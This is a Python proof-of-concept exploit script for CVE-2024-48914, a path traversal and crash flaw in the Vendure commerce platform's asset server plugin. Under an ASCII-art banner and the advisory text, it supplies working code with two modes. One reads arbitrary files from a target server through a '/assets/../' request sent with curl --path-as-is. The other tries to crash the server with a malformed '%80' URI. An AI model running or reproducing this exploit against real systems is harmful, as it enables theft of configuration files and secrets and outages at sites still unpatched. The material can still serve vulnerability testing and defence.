import subprocess
import requests
import rich_click as click
import time
import sys

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

banner = r"""



             ..-+*******-
            .=#+-------=@.                        .:==:.
           .**-------=*+:                      .-=++.-+=:.
           +*-------=#=+++++++++=:..          -+:==**=+-+:.
          .%----=+**+=-:::::::::-=+**+:.      ==:=*=-==+=..
          :%--**+-::::::::::::::::::::+*=:     .::*=**=:.
   ..-++++*@#+-:::::::::::::::::::::::::-*+.    ..-+:.
 ..+*+---=#+::::::::::::::::::::::::::::::=*:..-==-.
 .-#=---**:::::::::::::::::::::::::=+++-:::-#:..            :=+++++++==.   ..-======-.     ..:---:..
  ..=**#=::::::::::::::::::::::::::::::::::::%:.           *@@@@@@@@@@@@:.-#@@@@@@@@@%*:.-*%@@@@@@@%#=.
   .=#%=::::::::::::::::::::::::::::::::-::::-#.           %@@@@@@@@@@@@+:%@@@@@@@@@@@%==%@@@@@@@@@@@%-
  .*+*+:::::::::::-=-::::::::::::::::-*#*=::::#: ..*#*+:.  =++++***%@@@@+-@@@#====%@@@%==@@@#++++%@@@%-
  .+#*-::::::::::+*-::::::::::::::::::+=::::::-#..#+=+*%-.  :=====+#@@@@-=@@@+.  .%@@@%=+@@@+.  .#@@@%-
   .+*::::::::::::::::::::::::+*******=::::::--@.+@#+==#-. #@@@@@@@@@@@@.=@@@%*++*%@@@%=+@@@#====@@@@%-
   .=+:::::::::::::=*+::::::-**=-----=#-::::::-@%+=+*%#:. .@@@@@@@@@@@%=.:%@@@@@@@@@@@#-=%@@@@@@@@@@@#-
   .=*::::::::::::-+**=::::-#+--------+#:::-::#@%*==+*-   .@@@@#=----:.  .-+*#%%%%@@@@#-:+#%@@@@@@@@@#-
   .-*::::::::::::::::::::=#=---------=#:::::-%+=*#%#-.   .@@@@%######*+.       .-%@@@#:  .....:+@@@@*:
    :+=:::::::::::-:-::::-%=----------=#:::--%++++=**      %@@@@@@@@@@@@.        =%@@@#.        =@@@@*.
    .-*-:::::::::::::::::**---------=+#=:::-#**#*+#*.      -#%@@@@@@@@@#.        -%@@%*.        =@@@@+.
.::-==##**-:::-::::::::::%=-----=+***=::::=##+#=.::         ..::----:::.         .-=--.         .=+=-.
%+==--:::=*::::::::::::-:+#**+=**=::::::-#%=:-%.
*+.......+*::::::::::::::::-****-:::::=*=:.++:*=
.%:..::::*@@*-::::::::::::::-+=:::-+#%-.   .#*#.
 ++:.....#--#%**=-:::::::::::-+**+=:@#....-+*=.
 :#:....:#-::%..-*%#++++++%@@@%*+-.#-=#+++-..
 .++....-#:::%.   .-*+-..*=.+@= .=+..-#
 .:+++#@#-:-#= ...   .-++:-%@@=     .:#
     :+++**##@#+=.      -%@@@%-   .-=*#.
    .=+::+::-@:         #@@@@+. :+*=::=*-
    .=+:-**+%%+=-:..    =*#*-..=*-:::::=*
     :++---::--=*#+*+++++**+*+**-::::::+=
      .+*=:::---+*:::::++++++*+=:::::-*=.
       .:=**+====#*::::::=%:...-=++++=.      Author: EQST(Experts, Qualified Security Team)
           ..:----=**++++*+.                 Github: https://github.com/EQSTLab/CVE-2024-48914




Analysis base : https://github.com/vendure-ecommerce/vendure/security/advisories/GHSA-r9mq-3c9r-fmjq

=============================================================================================================

CVE-2024-48914 : Vendure is an open-source headless commerce platform. Prior to versions 3.0.5 and 2.3.3, a vulnerability in Vendure's asset server plugin allows an attacker to craft a request which is able to traverse the server file system and retrieve the contents of arbitrary files, including sensitive data such as configuration files, environment variables, and other critical data stored on the server. In the same code path is an additional vector for crashing the server via a malformed URI. Patches are available in versions 3.0.5 and 2.3.3. Some workarounds are also available. One may use object storage rather than the local file system, e.g. MinIO or S3, or define middleware which detects and blocks requests with urls containing `/../`.

=============================================================================================================
    """


class VenExploit:

    def __init__(self, url: str, file: str):
        self.url = url
        self.file = file

    @staticmethod
    def greeting() -> None:
        print(banner)

    @staticmethod
    def spinner(duration=10, interval=0.1) -> None:
        spinner_chars = ['|', '/', '-', '\\']
        end_time = time.time() + duration
        while time.time() < end_time:
            for char in spinner_chars:
                sys.stdout.write(f'\r[{char}] Exploit loading, please wait...')
                sys.stdout.flush()
                time.sleep(interval)
        print("")

    def readFile(self) -> None:
        # Use subprocess to run the curl command
        curl_command = [
            'curl',
            '--path-as-is',
            f'{self.url}/assets/../{self.file}'
        ]

        # Run the curl command
        result = subprocess.run(curl_command, capture_output=True, text=True)

        if result.returncode == 0:
            print(f"[+] File Found!\n{self.file}:")
            print(f"{result.stdout}")
        else:
            print(f"[-] Failed to exploit...\n{result.stderr}")

    def crashService(self) -> None:
        url = f"{self.url}/assets/%80"
        s = requests.Session()
        req = requests.Request(method='GET', url=url)
        prep = req.prepare()
        prep.url = url
        try:
            print(f"[+] Trying to Crash Server...")
            response = s.send(prep, verify=False)
        except:
            print(f"[+] Server Crashed...!")
            exit(1)
        print(f"[-] Server is Not Crashed...!")


# argument parsing with rich_click
@click.command()
@click.option(
    "-u",
    "--url",
    required=True,
    help="Specify a URL or domain for exploit",
)
@click.option(
    "-f",
    "--file",
    default="package.json",
    help="Specify the file to read from the server",
)
@click.option(
    "-m",
    "--mode",
    default="1",
    help="Choose mode (1: fileRead, 2: DoS)",
)

def main(url: str, file: str, mode: str) -> None:
    cve_exploit = VenExploit(url, file)
    VenExploit.greeting()
    VenExploit.spinner(duration=1)
    mode = mode.strip()
    if mode == "1":
        cve_exploit.readFile()
    elif mode == "2":
        cve_exploit.crashService()
    else:
        print("[-] Invalid Input!")
        exit(1)

if __name__ == "__main__":
    main()
